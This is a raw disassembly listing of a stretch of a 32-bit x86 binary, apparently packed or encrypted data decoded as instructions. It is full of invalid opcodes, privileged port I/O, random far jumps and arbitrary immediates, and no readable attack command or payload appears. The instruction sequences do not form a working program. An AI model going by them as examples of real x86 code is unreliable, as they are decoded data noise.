  42437a:	adc    eax,0x9488971b
  42437f:	adc    eax,0xc93cfc5e
  424384:	cld    
  424385:	add    DWORD PTR [ecx+0x269d1af],ebp
  42438b:	scas   al,BYTE PTR es:[edi]
  42438c:	lock pop ebx
  42438e:	mov    edi,DWORD PTR [edx+0x0]
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243c5
  424401:	sahf   
  424402:	into   
  424403:	add    DWORD PTR [edx+eax*4+0x1040001],edx
  42440a:	add    BYTE PTR [eax],al
  42440c:	mov    ecx,0x181a2675
  424411:	les    esp,FWORD PTR [ecx+0x28e0f326]
  424417:	aad    0x6c
  424419:	lods   al,BYTE PTR ds:[esi]
  42441a:	mov    ebx,DWORD PTR [ecx+eax*1]
  42441d:	sub    al,0xa8
  42441f:	mov    ah,0x8f
  424421:	hlt    
  424422:	in     al,dx
  424423:	pop    ebx
  424424:	or     DWORD PTR [ecx+0x47],ebp
  424427:	add    dl,BYTE PTR [ecx]
  424429:	push   edx
  42442a:	fs (bad) 
  42442c:	sahf   
  42442d:	cmc    
  42442e:	stos   DWORD PTR es:[edi],eax
  42442f:	pop    edx
  424430:	out    dx,eax
  424431:	lods   al,BYTE PTR ds:[esi]
  424432:	lock sub al,0xdb
  424435:	or     BYTE PTR [edi-0x58],dh
  424438:	scas   al,BYTE PTR es:[edi]
  424439:	in     eax,dx
  42443a:	add    dl,dl
  42443c:	cmc    
  42443d:	cmp    ebx,DWORD PTR [esi]
  42443f:	jno    0x424406
  424441:	mov    dl,0x68
  424443:	adc    al,0xf6
  424445:	cmp    ch,al
  424447:	jne    0x42446d
  424449:	or     BYTE PTR [edi-0x21aa7eb7],0xf8
  424450:	xchg   esi,eax
  424451:	mov    ch,0xd4
  424453:	aam    0x13
  424455:	adc    ebp,DWORD PTR [edx]
  424457:	adc    eax,0xc06ce9ef
  42445c:	and    ch,bh
  42445e:	push   esi
  42445f:	adc    al,0x8e
  424461:	aam    0x58
  424463:	push   ds
  424464:	and    BYTE PTR [eax+0x35],ah
  424467:	sbb    BYTE PTR [ecx-0xa],ah
  42446a:	imul   ebx,DWORD PTR [edi-0x61275126],0x4d851575
  424474:	xchg   edx,eax
  424475:	fcmovne st,st(6)
  424477:	iret   
  424478:	js     0x424479
  42447a:	adc    al,dh
  42447c:	pop    ecx
  42447d:	(bad)
  424480:	call   0x24ba:0x86a28f81
  424487:	rcr    BYTE PTR [esp+edx*2+0x66a3eb13],cl
  42448e:	or     eax,0xe7e55169
  424493:	jle    0x42441c
  424495:	ffreep st(3)
  424497:	test   BYTE PTR ds:0xbe3b0eab,dl
  42449d:	imul   ecx,DWORD PTR [ecx],0x50
  4244a0:	mov    esi,0x3cca917e
  4244a5:	cld    
  4244a6:	xor    al,0x18
  4244a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244a9:	mov    ah,0x97
  4244ab:	(bad)  
  4244ac:	enter  0xc424,0x8a
  4244b0:	adc    eax,0xfffffffc
  4244b3:	inc    ebp
  4244b4:	push   0xffffffdc
  4244b6:	lea    edx,[esi]
  4244b8:	push   ds
  4244b9:	push   ss
  4244ba:	fsub   QWORD PTR [esi+0x2c3734bf]
  4244c0:	pop    ebx
  4244c1:	add    al,0x61
  4244c3:	ficom  WORD PTR [ecx+0x2a]
  4244c6:	int    0x6
  4244c8:	push   cs
  4244c9:	mov    ebp,0xe655b9e2
  4244ce:	jb     0x424466
  4244d0:	add    ebp,DWORD PTR [edi]
  4244d2:	stc    
  4244d3:	push   cs
  4244d4:	mov    ebp,0x71aa09a1
  4244d9:	dec    ebp
  4244da:	or     dl,ah
  4244dc:	adc    dl,BYTE PTR ds:0x4bddeccb
  4244e2:	xchg   DWORD PTR [ebp+0xf8c65eb],eax
  4244e8:	push   edi
  4244e9:	into   
  4244ea:	cmp    BYTE PTR [esp+ecx*4],cl
  4244ed:	and    eax,0xaef9d93
  4244f2:	pusha  
  4244f3:	add    al,0x35
  4244f5:	out    0x93,al
  4244f7:	fwait
  4244f8:	mov    al,ds:0x2f811b19
  4244fd:	aas    
  4244fe:	repnz pop ebp
  424500:	mov    es:0x35f36a54,al
  424506:	cmp    eax,0xd8da06e8
  42450b:	jns    0x42450c
  42450d:	cmp    al,0xfc
  42450f:	push   ebx
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x31],1
  424581:	clc    
  424582:	dec    ebp
  424583:	mov    edx,0x18398
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	dec    edi
  42458d:	fisubr DWORD PTR [ecx+0x17]
  424590:	mov    esp,0x5ef0b954
  424595:	dec    eax
  424596:	add    eax,edi
  424598:	and    al,0x6
  42459a:	push   cs
  42459b:	or     eax,DWORD PTR [edx-0x1680fae]
  4245a1:	(bad)
  4245a5:	sub    BYTE PTR ds:0x79a2b789,0xcb
  4245ac:	jmp    0xf556ac89
  4245b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245b2:	push   es
  4245b3:	ins    DWORD PTR es:[edi],dx
  4245b4:	test   al,dl
  4245b6:	xor    BYTE PTR [edi+0x1e],dl
  4245b9:	mov    ebp,0x10661337
  4245be:	std    
  4245bf:	cmp    BYTE PTR [esp+esi*8+0x60],dh
  4245c3:	inc    eax
  4245c4:	mov    ch,0x4a
  4245c6:	sbb    eax,0xf4685a36
  4245cb:	outs   dx,BYTE PTR ds:[esi]
  4245cc:	mov    bl,0xb5
  4245ce:	cli    
  4245cf:	out    0xeb,eax
  4245d1:	jg     0x424599
  4245d3:	int3   
  4245d4:	sbb    eax,0xbc0b019d
  4245d9:	das    
  4245da:	jmp    0x8741:0x8f0456b5
  4245e1:	pop    ecx
  4245e2:	jns    0x42458a
  4245e4:	adc    al,0xde
  4245e6:	jmp    0x825d7631
  4245eb:	adc    DWORD PTR [edi+0x7e66f4d8],ebp
  4245f1:	pop    edi
  4245f2:	sub    al,0xef
  4245f4:	test   BYTE PTR [edi+0x764ca963],ch
  4245fa:	add    eax,eax
  4245fc:	loope  0x4245b4
  4245fe:	jge    0x4245cd
  424600:	sbb    al,0x8b
  424602:	(bad)  
  424603:	pop    edx
  424604:	call   0xd43236b7
  424609:	outs   dx,DWORD PTR ds:[esi]
  42460a:	push   0x7f3361e3
  42460f:	xchg   BYTE PTR [ecx],ah
  424611:	cmp    DWORD PTR [edx],ebp
  424613:	ds xchg ebp,eax
  424615:	mov    esi,0xca9bb32
  42461a:	xor    al,0xc7
  42461c:	or     bl,0xdc
  42461f:	mov    ecx,0xe6a5697
  424624:	retf   
  424625:	pop    ds
  424626:	mov    edx,0xa5f3c067
  42462b:	loope  0x42465a
  42462d:	adc    bh,0x70
  424630:	push   ss
  424631:	iret   
  424632:	or     DWORD PTR [ebp-0x1a391052],ecx
  424638:	mov    ch,0xb4
  42463a:	cmp    dh,BYTE PTR [ecx+0x4b7f9a29]
  424640:	xchg   edi,eax
  424641:	sub    bl,bl
  424643:	adc    dl,BYTE PTR [esi+edi*1-0x43d17ea5]
  42464a:	jne    0x4246be
  42464c:	imul   esp,DWORD PTR [edi],0x5d
  42464f:	idiv   BYTE PTR [esp-0x6ba06bab]
  424656:	push   esp
  424657:	xchg   ecx,eax
  424658:	pop    ebp
  424659:	fisub  DWORD PTR [ebx+0x54]
  42465c:	int    0x3e
  42465e:	shl    DWORD PTR [ecx+0x1b75bea4],0x8b
  424665:	sub    DWORD PTR [ecx],edi
  424667:	lods   al,BYTE PTR ds:[esi]
  424668:	mov    ebx,0x2f6bd313
  42466d:	stc    
  42466e:	mov    eax,DWORD PTR [eax-0x64]
  424671:	pop    ds
  424672:	inc    ebp
  424673:	cli    
  424674:	jo     0x4245f9
  424676:	(bad)  
  424677:	mov    ah,BYTE PTR [edx+ebx*2+0x2f]
  42467b:	lds    ecx,FWORD PTR [ecx]
  42467d:	ret    
  42467e:	arpl   WORD PTR [eax+0x6],ax
  424681:	xchg   esp,eax
  424682:	push   es
  424683:	test   eax,0xf782ece5
  424688:	jge    0x4246fc
  42468a:	inc    edi
  42468b:	fwait
  42468c:	xor    DWORD PTR [esi+0x7bee],ebx
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    bh,dh
  424701:	stc    
  424702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424703:	imul   ebx,DWORD PTR [esp+eax*4+0x1040001],0x0
  42470b:	add    BYTE PTR [edx+eax*8],bh
  42470e:	std    
  42470f:	imul   ebp,DWORD PTR [edx+0x72],0x6c
  424713:	adc    DWORD PTR [ecx],edi
  424715:	js     0x424724
  424717:	cmc    
  424718:	ffreep st(4)
  42471a:	imul   esp,eax,0x64
  42471d:	or     BYTE PTR [ecx],bh
  42471f:	scas   al,BYTE PTR es:[edi]
  424720:	out    0x17,eax
  424722:	je     0x42473e
  424724:	xchg   al,al
  424726:	add    BYTE PTR [ebx+0x4a6a6fbc],ch
  42472c:	cmp    BYTE PTR [esp+ebp*1],0x70
  424730:	aam    0x60
  424732:	cld    
  424733:	sub    eax,0xab16fe3f
  424738:	add    BYTE PTR [esp+edx*1],ch
  42473b:	dec    eax
  42473c:	dec    DWORD PTR [ecx+0x275a4186]
  424742:	add    eax,0x58c3ea2d
  424747:	mov    eax,0x6aad734
  42474c:	aas    
  42474d:	and    DWORD PTR [ebp+0x4e],ecx
  424750:	cmp    BYTE PTR [ebx+0x609d9133],al
  424756:	push   ecx
  424757:	inc    ebx
  424758:	cmp    BYTE PTR [ecx+ecx*1-0x2987079a],al
  42475f:	inc    ebx
  424760:	inc    eax
  424761:	das    
  424762:	icebp  
  424763:	xor    al,0x92
  424765:	fsubr  st(4),st
  424767:	push   ecx
  424768:	jecxz  0x4247ca
  42476a:	in     eax,dx
  42476b:	push   ebp
  42476c:	in     eax,dx
  42476d:	js     0x4247a9
  42476f:	pusha  
  424770:	sbb    eax,0x407fa43f
  424775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424776:	sbb    BYTE PTR ds:0x3305fa1c,bl
  42477c:	enter  0x715e,0xc
  424780:	jmp    0xae55:0xc7be61a1
  424787:	mov    ebp,0x9eb502e2
  42478c:	cld    
  42478d:	(bad)  
  42478e:	aad    0xa6
  424790:	jns    0x42474c
  424792:	aam    0x7f
  424794:	inc    esp
  424795:	sub    al,BYTE PTR [edx+0x1ba06401]
  42479b:	adc    edi,ebx
  42479d:	adc    DWORD PTR [edx],edi
  42479f:	stos   DWORD PTR es:[edi],eax
  4247a0:	jae    0x424803
  4247a2:	sbb    DWORD PTR [edx-0x3d],esi
  4247a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247a6:	add    BYTE PTR [esi+0x10],ch
  4247a9:	push   ecx
  4247aa:	mov    WORD PTR [ecx+ebp*1-0x29],gs
  4247ae:	ret    
  4247af:	bound  esi,QWORD PTR [ebx-0x6c78e8d7]
  4247b5:	stos   DWORD PTR es:[edi],eax
  4247b6:	fs cli 
  4247b8:	(bad)  
  4247ba:	imul   eax,DWORD PTR [edi-0x18],0x4024b716
  4247c1:	cmp    eax,0x6b242224
  4247c6:	bound  eax,QWORD PTR [ecx]
  4247c8:	ds add eax,0xa4e89a3f
  4247ce:	daa    
  4247cf:	cdq    
  4247d0:	inc    edi
  4247d1:	outs   dx,BYTE PTR ds:[esi]
  4247d2:	sbb    BYTE PTR ds:0x7d2ff294,al
  4247d8:	loope  0x4247e3
  4247da:	inc    eax
  4247db:	imul   dh
  4247dd:	push   ecx
  4247de:	lahf   
  4247df:	add    ah,BYTE PTR [ebx+0x76777124]
  4247e5:	jno    0x4247a1
  4247e7:	cdq    
  4247e8:	jle    0x4247dd
  4247ea:	add    ebp,DWORD PTR [ecx+0x6746ab87]
  4247f0:	aad    0xe9
  4247f2:	push   edx
  4247f3:	aad    0xa
  4247f5:	fmul   DWORD PTR [eax+0x771ad0c7]
  4247fb:	mov    esi,0x680e00d3
  424800:	xor    bl,0xfe
  424803:	xchg   BYTE PTR [edi-0x2f],bl
  424806:	and    bl,BYTE PTR [ebp+0x3cbc4920]
  42480c:	mov    ecx,0xd05620
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	rcr    BYTE PTR [ecx-0x24],1
  424883:	daa    
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    BYTE PTR ds:0xb982a3bd,ch
  424891:	dec    ebx
  424892:	cs dec esp
  424894:	mov    ch,0xcc
  424896:	xchg   edx,eax
  424897:	push   edx
  424898:	callw  0x4fbf
  42489c:	mov    esp,0x55649abb
  4248a1:	inc    ecx
  4248a2:	xchg   esp,eax
  4248a3:	jge    0x4248b8
  4248a5:	rcl    al,0x1b
  4248a8:	loop   0x424851
  4248aa:	fcom   st(7)
  4248ac:	sbb    BYTE PTR [edi-0x58],al
  4248af:	mov    WORD PTR [edx-0x5d],cs
  4248b2:	xor    eax,0xa9d003c1
  4248b7:	fcom   DWORD PTR [esi+0x6a3fecad]
  4248bd:	jo     0x42484a
  4248bf:	cld    
  4248c0:	add    BYTE PTR [edi-0x6a],0x57
  4248c4:	iret   
  4248c5:	ret    
  4248c6:	add    BYTE PTR [ebx+0x3079994e],bl
  4248cc:	cmc    
  4248cd:	fsubr  QWORD PTR [eax+0x6]
  4248d0:	push   0xffffffb2
  4248d2:	call   0x54c7df9
  4248d7:	mov    edi,0x2ac96b72
  4248dc:	scas   al,BYTE PTR es:[edi]
  4248dd:	mov    esp,0x2ce386f5
  4248e2:	fstp   DWORD PTR [eax+0x3ab25496]
  4248e8:	jmp    0x526d:0x40e54660
  4248ef:	rcl    ch,1
  4248f1:	inc    ecx
  4248f2:	pop    ebp
  4248f3:	jns    0x424897
  4248f5:	jmp    0xc0fe1844
  4248fa:	pop    eax
  4248fb:	adc    cl,BYTE PTR [edx+edi*1]
  4248fe:	lods   eax,DWORD PTR ds:[esi]
  4248ff:	add    ch,bl
  424901:	push   cs
  424902:	cmp    DWORD PTR [ecx],0xffffffdd
  424905:	pop    esp
  424906:	sbb    esp,esp
  424908:	mov    dh,0x9f
  42490a:	cld    
  42490b:	sub    bl,BYTE PTR [edx-0x33]
  42490e:	loop   0x4248b7
  424910:	gs call 0x438b:0xaf75b41c
  424918:	loope  0x4248d3
  42491a:	push   ds
  42491b:	cli    
  42491c:	lock sub al,0xa8
  42491f:	push   esi
  424920:	iret   
  424921:	mov    al,ds:0xbd2c1fda
  424926:	jbe    0x4248cd
  424928:	add    ah,BYTE PTR [ebx-0x7f]
  42492b:	icebp  
  42492c:	adc    ecx,DWORD PTR [ecx+0x7dc055e4]
  424932:	mov    BYTE PTR [ebp*2-0x6b1d5afa],bl
  424939:	dec    ebx
  42493a:	jecxz  0x424928
  42493c:	cmp    cl,BYTE PTR [eax-0x1e]
  42493f:	fld    QWORD PTR [edi-0x50]
  424942:	jp     0x4248fe
  424944:	into   
  424945:	fmulp  st(0),st
  424947:	pushf  
  424948:	test   BYTE PTR [eax+edi*2+0xd],cl
  42494c:	add    bh,dl
  42494e:	imul   ebx,DWORD PTR [esi],0x19
  424951:	jmp    FWORD PTR [ecx-0x2218e060]
  424957:	pminub mm3,mm5
  42495a:	xlat   BYTE PTR ds:[ebx]
  42495b:	xchg   esp,eax
  42495c:	inc    ebx
  42495d:	mov    dh,0xce
  42495f:	or     eax,0x26e7c1b0
  424964:	jbe    0x4249ca
  424966:	lahf   
  424967:	idiv   esi
  424969:	jmp    0x6d55:0xf62fc855
  424970:	mov    ebx,0xef069f62
  424975:	mov    al,0xe9
  424977:	jge    0x42490e
  424979:	lahf   
  42497a:	and    eax,0x2470d4e2
  42497f:	addr16 ss and dl,dl
  424983:	mov    ah,0xf
  424985:	mov    esi,0xbb5aa19e
  42498a:	xor    DWORD PTR [edi-0x7da496f0],esi
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    ch,BYTE PTR [ebp-0x26]
  424a02:	cmp    al,ch
  424a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	cmp    al,0xc4
  424a0e:	xchg   edx,eax
  424a0f:	add    DWORD PTR [eax+0x793931a5],ebp
  424a15:	test   bl,ch
  424a17:	lods   eax,DWORD PTR ds:[esi]
  424a18:	mov    dl,0xef
  424a1a:	repnz add edi,ecx
  424a1d:	out    dx,al
  424a1e:	sahf   
  424a1f:	xor    al,0xb7
  424a21:	in     al,0x2d
  424a23:	hlt    
  424a24:	cmp    al,0x13
  424a26:	jge    0x424a27
  424a28:	mov    dh,0x4b
  424a2a:	out    dx,eax
  424a2b:	xchg   al,bl
  424a2d:	mov    ds:0xb8e8d6aa,eax
  424a32:	add    DWORD PTR [esi],edx
  424a34:	push   cs
  424a35:	test   DWORD PTR [ecx],0x1fc76cfc
  424a3b:	inc    ecx
  424a3c:	inc    ebx
  424a3d:	cwde   
  424a3e:	(bad)  
  424a3f:	pushf  
  424a40:	add    dl,BYTE PTR [edi-0xb]
  424a43:	mov    esp,DWORD PTR [ebx-0x2a5473]
  424a49:	inc    edx
  424a4a:	mov    ch,0x42
  424a4c:	and    al,dh
  424a4e:	inc    ebx
  424a4f:	stc    
  424a50:	jae    0x424ac1
  424a52:	shr    ah,0xd6
  424a55:	cmp    BYTE PTR [edi+0x44],0x28
  424a59:	psllw  mm0,QWORD PTR [edx]
  424a5c:	xor    eax,0x4619f07
  424a61:	fstp   TBYTE PTR [esi]
  424a63:	add    eax,0x1c0d4fb1
  424a68:	push   edi
  424a69:	pop    eax
  424a6a:	mov    ebx,0xb19d8af3
  424a6f:	sub    BYTE PTR [ebx],ch
  424a71:	cmp    al,0xa
  424a73:	cmp    DWORD PTR [ebp-0x46],0x7c
  424a77:	cli    
  424a78:	hlt    
  424a79:	sbb    al,0x64
  424a7b:	out    dx,al
  424a7c:	es xchg cl,ah
  424a7f:	(bad)  
  424a80:	mov    dh,0x5f
  424a82:	sar    BYTE PTR [ecx],0x5a
  424a85:	addr16 jge 0x424a7c
  424a88:	jbe    0x424a4e
  424a8a:	or     eax,0x258fb6d9
  424a8f:	add    al,0x37
  424a91:	loopne 0x424a13
  424a93:	not    esi
  424a95:	and    DWORD PTR [esi+0x50],ebx
  424a98:	dec    esi
  424a99:	sub    BYTE PTR [eax],0xed
  424a9c:	jle    0x424aa9
  424a9e:	push   edx
  424a9f:	and    eax,0x88e15d41
  424aa4:	scas   al,BYTE PTR es:[edi]
  424aa5:	repz jmp 0x15b5b3a0
  424aab:	fs mov edi,0x4f7be8b9
  424ab1:	lock dec esi
  424ab3:	sar    DWORD PTR [edx+0x764d688b],cl
  424ab9:	adc    BYTE PTR [edi-0x8],bh
  424abc:	mov    ch,0x75
  424abe:	sbb    DWORD PTR [ebp*4-0x3ab5a96f],edi
  424ac5:	xchg   ecx,eax
  424ac6:	mov    bl,0x46
  424ac8:	iret   
  424ac9:	inc    ebp
  424aca:	in     al,0x30
  424acc:	jnp    0x424a95
  424ace:	xor    al,0xf2
  424ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ad1:	ror    DWORD PTR [ecx+0x15],cl
  424ad4:	stos   BYTE PTR es:[edi],al
  424ad5:	repnz mov ch,0x5e
  424ad8:	xchg   esi,eax
  424ad9:	mov    ds:0x62c9252f,al
  424ade:	jg     0x424a73
  424ae0:	mov    edx,0xb75c24c3
  424ae5:	pushf  
  424ae6:	pop    edi
  424ae7:	sbb    BYTE PTR [esi],dh
  424ae9:	or     edi,edx
  424aeb:	ss pop ss
  424aed:	scas   al,BYTE PTR es:[edi]
  424aee:	int    0xe
  424af0:	and    ebx,0xffffffb1
  424af3:	push   es
  424af4:	sub    ch,BYTE PTR [edx]
  424af6:	or     eax,0xb48e9e86
  424afb:	inc    ebp
  424afc:	sar    DWORD PTR fs:[edi-0x4d205246],0x99
  424b04:	stos   BYTE PTR es:[edi],al
  424b05:	or     al,BYTE PTR [ebx+0x4a]
  424b08:	outs   dx,DWORD PTR ds:[esi]
  424b09:	add    al,0xd8
  424b0b:	rep ins DWORD PTR es:[edi],dx
  424b0d:	adc    BYTE PTR [eax-0x4f],bh
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	mov    ds:0xa819a80a,eax
  424b85:	xchg   DWORD PTR [ecx],eax
  424b87:	add    BYTE PTR [ecx+eax*1],al
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	test   al,0xa5
  424b8e:	jl     0x424b45
  424b90:	jno    0x424b74
  424b92:	mov    eax,0xb6986d30
  424b97:	in     eax,0xbf
  424b99:	fdivrp st(1),st
  424b9b:	dec    esi
  424b9c:	push   0x94a126b3
  424ba1:	jecxz  0x424b62
  424ba3:	cmp    edx,edx
  424ba5:	add    BYTE PTR [ebx],ah
  424ba7:	imul   eax,DWORD PTR [eax-0x7f],0xffffff85
  424bab:	(bad)  
  424bac:	cs jnp 0x424b34
  424baf:	data16 fiadd WORD PTR [ebp+eax*2-0x30]
  424bb4:	dec    ecx
  424bb5:	ins    DWORD PTR es:[edi],dx
  424bb6:	mov    dh,0x5e
  424bb8:	enter  0xcc7d,0x39
  424bbc:	pop    esi
  424bbd:	dec    eax
  424bbe:	pop    es
  424bbf:	mov    cl,0x33
  424bc1:	psubw  mm0,QWORD PTR [edx-0x6c]
  424bc5:	mov    ecx,0x63a0d215
  424bca:	push   cs
  424bcb:	cdq    
  424bcc:	jge    0x424b8e
  424bce:	out    0x9a,eax
  424bd0:	cs pop ebx
  424bd2:	out    dx,al
  424bd3:	leave  
  424bd4:	popf   
  424bd5:	mov    esi,0x432ed012
  424bda:	inc    ebx
  424bdb:	retf   
  424bdc:	mov    ebp,0x20fc58eb
  424be1:	mov    ebx,DWORD PTR [edx-0x62]
  424be4:	or     al,0x68
  424be6:	cmp    bl,BYTE PTR [esp+edx*2]
  424be9:	adc    ecx,DWORD PTR [eax+ecx*8-0x56c1a5c5]
  424bf0:	cli    
  424bf1:	in     al,dx
  424bf2:	int3   
  424bf3:	inc    esi
  424bf4:	adc    ah,BYTE PTR [edx]
  424bf6:	and    esi,eax
  424bf8:	je     0x424b8d
  424bfa:	pop    ecx
  424bfb:	push   ebp
  424bfd:	add    eax,DWORD PTR [ebx]
  424bff:	imul   edi,DWORD PTR [ebx-0x5213e164],0xffffffa2
  424c06:	add    ecx,DWORD PTR [esi]
  424c08:	fwait
  424c09:	pop    ss
  424c0a:	div    DWORD PTR ds:0x88a8a005
  424c10:	aad    0xf
  424c12:	jb     0x424bc6
  424c14:	int    0x7f
  424c16:	xchg   DWORD PTR [eax-0x52],edi
  424c19:	adc    DWORD PTR [ebp-0x1c927e06],ecx
  424c1f:	cmp    ebp,DWORD PTR ss:[ecx-0x7]
  424c23:	add    eax,0x3b7f5f93
  424c28:	jmp    DWORD PTR [ecx-0x33c55c7a]
  424c2e:	sbb    al,0x6
  424c30:	(bad)  
  424c31:	into   
  424c32:	sub    edx,DWORD PTR [edi+0x12]
  424c35:	sub    ah,BYTE PTR [esi]
  424c37:	stc    
  424c38:	shr    ah,cl
  424c3a:	xchg   DWORD PTR ds:0xe7511f57,ecx
  424c40:	inc    ecx
  424c41:	xor    eax,0x91d88267
  424c46:	dec    ebx
  424c47:	pop    edx
  424c48:	in     al,dx
  424c49:	fld    QWORD PTR [eax+0x7f]
  424c4c:	dec    eax
  424c4d:	pop    esp
  424c4e:	inc    eax
  424c4f:	gs sub al,0xb0
  424c52:	dec    eax
  424c53:	or     BYTE PTR [esi-0x5b],bl
  424c56:	xor    eax,0x6eeb3777
  424c5b:	cmc    
  424c5c:	in     al,dx
  424c5d:	or     edx,ecx
  424c5f:	lea    edx,[ebx-0x547892]
  424c65:	jmp    0x424ce5
  424c67:	retf   0x74f9
  424c6a:	jb     0x424c22
  424c6c:	jbe    0x424c00
  424c6e:	ret    0x742f
  424c71:	pop    edi
  424c72:	enter  0x40ad,0xa
  424c76:	jbe    0x424c1c
  424c78:	jmp    0x7095:0x48cdda1e
  424c7f:	xchg   DWORD PTR [ecx-0x5a00f777],edx
  424c85:	(bad)  
  424c86:	push   0x5f
  424c88:	inc    edi
  424c89:	sbb    ebp,DWORD PTR [ebp+0x68]
  424c8c:	sbb    al,0xf7
  424c8e:	dec    edx
  424c8f:	(bad)  
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x467cae58]
  424d02:	(bad)  
  424d03:	clc    
  424d04:	lods   al,BYTE PTR ds:[esi]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	loopne 0x424d17
  424d0e:	call   0x1501:0x535ead6
  424d15:	std    
  424d16:	xchg   edx,eax
  424d17:	or     ch,al
  424d19:	rcr    esi,cl
  424d1b:	xchg   BYTE PTR [esi+esi*1],dh
  424d1e:	sbb    al,0x15
  424d20:	cs add al,0xa2
  424d23:	and    al,0x3a
  424d25:	mov    es,WORD PTR ds:0x5d728f47
  424d2b:	test   ch,dl
  424d2d:	loop   0x424d8c
  424d2f:	and    DWORD PTR [edx],esi
  424d31:	hlt    
  424d32:	(bad)  
  424d34:	inc    esp
  424d35:	sahf   
  424d36:	out    0xe5,eax
  424d38:	and    eax,0xdd2fe769
  424d3d:	mov    ah,0x27
  424d3f:	fsubp  st(7),st
  424d41:	fadd   DWORD PTR [esp+edi*1]
  424d44:	test   al,0x27
  424d46:	jle    0x424cf7
  424d48:	call   0xcc4c:0xb858e453
  424d4f:	jb     0x424d33
  424d51:	fucomip st,st(5)
  424d53:	dec    esi
  424d55:	in     al,0x40
  424d57:	js     0x424d0b
  424d59:	sbb    BYTE PTR [ebx-0x4d97d977],dl
  424d5f:	sub    al,0xf6
  424d61:	inc    esi
  424d62:	ja     0x424cfe
  424d64:	dec    ebx
  424d65:	imul   eax,DWORD PTR [esi+0x66],0x6b
  424d69:	mov    DWORD PTR [edi-0x4ed4a79d],esi
  424d6f:	mov    ah,0x74
  424d71:	mov    edx,0x78dd0490
  424d76:	aam    0xf7
  424d78:	adc    edi,DWORD PTR [ecx-0x72]
  424d7b:	sub    esp,DWORD PTR [edi+0x213b4e62]
  424d81:	sbb    ch,ch
  424d83:	out    dx,al
  424d84:	pop    ds
  424d85:	div    BYTE PTR [ecx+0x61]
  424d88:	add    DWORD PTR [edi+0xec45ef3],edx
  424d8e:	aam    0xe3
  424d90:	xor    ebp,DWORD PTR [edx]
  424d92:	add    eax,0xc89b9095
  424d97:	(bad)  
  424d98:	jmp    0x424de5
  424d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d9b:	mov    DWORD PTR [ecx],edi
  424d9d:	out    dx,al
  424d9e:	ss dec edi
  424da0:	and    ecx,ebp
  424da2:	cdq    
  424da3:	mov    edx,0x3188cd9e
  424da8:	jne    0x424da8
  424daa:	xor    eax,0xfb27bb49
  424daf:	push   ebx
  424db0:	in     al,dx
  424db1:	jecxz  0x424dae
  424db3:	xor    BYTE PTR [ebx+0x76],ah
  424db6:	jmp    0x1205:0x6aaddec
  424dbd:	(bad)  
  424dbf:	push   ds
  424dc0:	and    DWORD PTR [edi],0xe13edf22
  424dc6:	cwde   
  424dc7:	arpl   WORD PTR [ecx+0x5fb33778],dx
  424dcd:	out    0x7b,eax
  424dcf:	call   0x2640d454
  424dd4:	sub    DWORD PTR [ebx-0x3a576f72],ecx
  424dda:	in     eax,0xcb
  424ddc:	lds    edx,FWORD PTR [ebx-0x59dd8753]
  424de2:	pop    eax
  424de3:	mov    BYTE PTR [ebx-0x2fdbff06],bh
  424de9:	xchg   ebx,eax
  424dea:	out    dx,eax
  424deb:	inc    ebp
  424dec:	jmp    0xfe94:0x2ffc77fd
  424df3:	adc    ebp,DWORD PTR [edx+0x325c50aa]
  424df9:	and    BYTE PTR ds:0xdeb48c22,0xa6
  424e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e01:	mov    esp,0x584a795f
  424e06:	dec    edx
  424e07:	add    ch,BYTE PTR [esi]
  424e09:	imul   edx,DWORD PTR [eax],0x21
  424e0c:	mov    esp,DWORD PTR [eax]
  424e0e:	fst    QWORD PTR [eax+eax*1]
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e42
  424e81:	push   ebp
  424e82:	(bad)  
  424e83:	scas   al,BYTE PTR es:[edi]
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
